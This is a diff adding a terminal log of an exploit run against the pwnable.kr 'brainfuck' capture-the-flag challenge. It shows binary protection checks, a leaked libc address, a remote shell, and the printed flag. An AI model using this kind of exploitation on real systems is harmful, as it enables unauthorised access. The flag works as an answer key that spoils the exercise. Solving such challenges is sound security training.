@@ -1,0 +1,27 @@
+root@localhost:~/Desktop/Pwn/pwnable.kr/brainfuck# python bf.py
+[+] Opening connection to pwnable.kr on port 9001: Done
+[*] '/root/Desktop/Pwn/pwnable.kr/brainfuck/bf'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/root/Desktop/Pwn/pwnable.kr/brainfuck/bf_libc.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+JUNK:�
+OFFSET:0xf7585000
+[*] Switching to interactive mode
+welcome to brainfuck testing system!!
+type some brainfuck instructions except [ ]
+$ ls
+brainfuck
+flag
+libc-2.23.so
+log
+super.pl
+$ cat flag
+BrainFuck? what a weird language..
